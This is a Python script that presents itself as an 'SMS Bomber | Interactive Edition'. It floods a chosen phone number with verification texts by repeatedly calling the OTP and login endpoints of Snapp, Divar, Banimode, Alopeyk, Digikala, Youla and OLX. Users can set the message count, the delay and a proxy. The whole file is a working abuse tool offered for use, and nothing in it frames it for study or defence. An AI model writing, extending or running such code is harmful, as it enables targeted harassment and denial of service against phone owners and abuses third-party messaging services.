import threading
import time
import re
import sys
from colorama import Fore, Style, init
import httpx

init(autoreset=True)

# --------- API Functions ---------
def send_sms_snapp(phone, country, proxy=None):
    try:
        phone_full = f"{country}{phone}"
        url = "https://api.snapp.ir/api/v1/sms/link"
        data = {"phone": phone_full}
        headers = {"User-Agent": "okhttp/3.12.1", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            return r.status_code == 200 or r.status_code == 201
    except Exception:
        return False

def send_sms_divar(phone, country, proxy=None):
    try:
        phone_full = f"{country}{phone}"
        url = "https://api.divar.ir/v5/auth/authenticate"
        data = {"phone": phone_full}
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            return r.status_code == 200
    except Exception:
        return False

def send_sms_banimode(phone, country, proxy=None):
    try:
        phone_full = f"{country}{phone}"
        url = "https://mobapi.banimode.com/api/v2/auth/request"
        data = {"phone": phone_full}
        headers = {"User-Agent": "okhttp/3.12.1", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            return r.status_code == 200 or r.status_code == 201
    except Exception:
        return False

def send_sms_alopeyk(phone, country, proxy=None):
    try:
        phone_full = f"{country}{phone}"
        url = "https://sandbox-api.alopeyk.com/api/v2/user/otp"
        data = {"phone": phone_full}
        headers = {"User-Agent": "okhttp/3.12.1", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            return r.status_code == 200 or r.status_code == 201
    except Exception:
        return False

def send_sms_digikala(phone, country, proxy=None):
    try:
        phone_full = f"0{phone}" if not phone.startswith("0") else phone
        url = "https://api.digikala.com/v1/user/authenticate/"
        data = {"username": phone_full}
        headers = {"User-Agent": "okhttp/3.12.1", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            return r.status_code == 200
    except Exception:
        return False

def send_sms_youla(phone, country, proxy=None):
    try:
        phone_full = f"+{country}{phone}"
        url = "https://youla.ru/web-api/auth/request_code"
        data = {"phone": phone_full}
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            return r.status_code == 200
    except Exception:
        return False

def send_sms_olx(phone, country, proxy=None):
    try:
        phone_full = f"+{country}{phone}"
        url = "https://www.olx.in/api/auth/authenticate"
        data = {"mobile": phone_full}
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            return r.status_code == 200
    except Exception:
        return False

# --------- API List ---------
SMS_APIS = [
    {
        "name": "Snapp",
        "desc": "Iranian ride-hailing",
        "check_url": "https://api.snapp.ir/api/v1/sms/link",
        "func": send_sms_snapp
    },
    {
        "name": "Divar",
        "desc": "Iranian classifieds",
        "check_url": "https://api.divar.ir/v5/auth/authenticate",
        "func": send_sms_divar
    },
    {
        "name": "Banimode",
        "desc": "Iranian shopping",
        "check_url": "https://mobapi.banimode.com/api/v2/auth/request",
        "func": send_sms_banimode
    },
    {
        "name": "Alopeyk",
        "desc": "Iranian delivery",
        "check_url": "https://sandbox-api.alopeyk.com/api/v2/user/otp",
        "func": send_sms_alopeyk
    },
    {
        "name": "Digikala",
        "desc": "Iranian marketplace",
        "check_url": "https://api.digikala.com/v1/user/authenticate/",
        "func": send_sms_digikala
    },
    {
        "name": "Youla",
        "desc": "Russian classifieds",
        "check_url": "https://youla.ru/web-api/auth/request_code",
        "func": send_sms_youla
    },
    {
        "name": "OLX",
        "desc": "India / Global",
        "check_url": "https://www.olx.in/api/auth/authenticate",
        "func": send_sms_olx
    }
]

# --------- Utils ---------
def banner():
    print(Fore.CYAN + r"""
  _____ ____  __  __ ____   ____                      _           
 / ____/ __ \|  \/  |  _ \ / __ )___  ____ ______    (_)___  ____ 
| (___| |  | | \  / | |_) | |  |/ _ \/ __ `/ ___/   / / __ \/ __ \
 \___ \ |  | | |\/| |  _ <| |  /  __/ /_/ (__  )   / / /_/ / / / /
 ____) | |__| | |  | | |_) | |__|___/\__,_/____/  /_/\____/_/ /_/ 
|_____/ \____/|_|  |_|____/|____/                                   
    """ + Style.RESET_ALL)
    print(Fore.YELLOW + "          SMS Bomber | Interactive Edition\n" + Style.RESET_ALL)

def parse_number(number: str):
    digits = re.sub(r'\D', '', number)
    if digits.startswith('00'):
        digits = digits[2:]
    if digits.startswith('98') and len(digits) == 12:
        country = '98'
        phone = digits[2:]
    elif digits.startswith('9') and len(digits) == 10:
        country = '98'
        phone = digits
    elif digits.startswith('0') and len(digits) == 11:
        country = '98'
        phone = digits[1:]
    elif len(digits) > 10:
        country = digits[:-10]
        phone = digits[-10:]
    else:
        print(Fore.RED + "[!] Please enter a phone number with country code. Example: 989123456789" + Style.RESET_ALL)
        sys.exit(1)
    return country, phone

def get_input(prompt, color=Fore.GREEN):
    return input(color + prompt + Style.RESET_ALL)

def check_api_online(api):
    try:
        with httpx.Client(timeout=5) as client:
            resp = client.options(api["check_url"])
            return resp.status_code < 500
    except Exception:
        return False

def api_mode_menu(online_apis):
    print(Fore.CYAN + "\n[ API Send Mode ]\n")
    print(Fore.MAGENTA + "[1]" + Fore.WHITE + " Send using one selected API")
    print(Fore.MAGENTA + "[2]" + Fore.WHITE + " Send using ALL available online APIs")
    print(Fore.MAGENTA + "[0]" + Fore.WHITE + " Cancel" + Style.RESET_ALL)
    while True:
        choice = input(Fore.YELLOW + "\nChoose mode: " + Style.RESET_ALL)
        if choice == "1":
            for idx, api in enumerate(online_apis):
                print(f"{Fore.GREEN}[{idx+1}] {api['name']} ({api['desc']}){Style.RESET_ALL}")
            while True:
                api_choice = input(Fore.YELLOW + "\nChoose API by number: " + Style.RESET_ALL)
                if api_choice.isdigit():
                    idx = int(api_choice)-1
                    if 0 <= idx < len(online_apis):
                        return "one", online_apis[idx]
                    else:
                        print(Fore.RED + "Invalid choice." + Style.RESET_ALL)
                else:
                    print(Fore.RED + "Enter a valid number." + Style.RESET_ALL)
        elif choice == "2":
            return "all", online_apis
        elif choice == "0":
            return None, None
        else:
            print(Fore.RED + "Invalid mode. Try again." + Style.RESET_ALL)

def main_menu():
    banner()
    print(Fore.MAGENTA + "[1]" + Fore.WHITE + " Start SMS Bombing")
    print(Fore.MAGENTA + "[2]" + Fore.WHITE + " Help & Instructions")
    print(Fore.MAGENTA + "[0]" + Fore.WHITE + " Exit" + Style.RESET_ALL)
    choice = get_input("Select an option: ", Fore.YELLOW)
    return choice

def show_help():
    print(Fore.CYAN + "\nPlease enter the phone number in this format: 989123456789")
    print("For Iran, always start with 98. For other countries, use the appropriate country code.")
    print("You can adjust the number of messages, timeout, and proxy from the menu.")
    print("API online check and selection is automatic.\n")
    input(Fore.YELLOW + "\nPress Enter to return to the main menu..." + Style.RESET_ALL)

def start_bomb():
    print()
    number = get_input("Target phone number (with country code): ", Fore.CYAN)
    try:
        country, target = parse_number(number)
    except Exception as e:
        print(Fore.RED + str(e))
        return

    print(Fore.YELLOW + "\nChecking online APIs, please wait...\n" + Style.RESET_ALL)
    online_apis = [api for api in SMS_APIS if check_api_online(api)]

    if not online_apis:
        print(Fore.RED + "No online API found. Try again later." + Style.RESET_ALL)
        return

    mode, chosen = api_mode_menu(online_apis)
    if not mode:
        print(Fore.YELLOW + "Cancelled." + Style.RESET_ALL)
        return

    num = get_input("Number of messages (default 10): ", Fore.CYAN)
    num = int(num) if num.strip().isdigit() else 10

    timeout = get_input("Timeout between messages (seconds, default 1): ", Fore.CYAN)
    timeout = float(timeout) if timeout.strip().replace(".", "").isdigit() else 1.0

    proxy = get_input("Proxy (leave blank for none): ", Fore.CYAN)
    proxy = proxy.strip() or None

    print(f"{Fore.GREEN}\n[+] Sending {num} SMS to {country}{target} | Mode: {mode}{Style.RESET_ALL}\n")

    sent, failed = 0, 0
    for i in range(num):
        if mode == "one":
            apis_to_use = [chosen]
        else:
            apis_to_use = online_apis
        for api in apis_to_use:
            success = api["func"](target, country, proxy)
            if success:
                sent += 1
                print(Fore.GREEN + f"[{api['name']}] SMS sent successfully!" + Style.RESET_ALL)
            else:
                failed += 1
                print(Fore.RED + f"[{api['name']}] SMS failed!" + Style.RESET_ALL)
            time.sleep(timeout)
    print(Fore.CYAN + f"\n[=] Finished! Total sent: {sent}, failed: {failed}\n" + Style.RESET_ALL)
    input(Fore.YELLOW + "Press Enter to return to the main menu..." + Style.RESET_ALL)

def main():
    while True:
        choice = main_menu()
        if choice == "1":
            start_bomb()
        elif choice == "2":
            show_help()
        elif choice == "0":
            print(Fore.GREEN + "Exiting. Have a great day!" + Style.RESET_ALL)
            sys.exit(0)
        else:
            print(Fore.RED + "Invalid option! Please try again." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
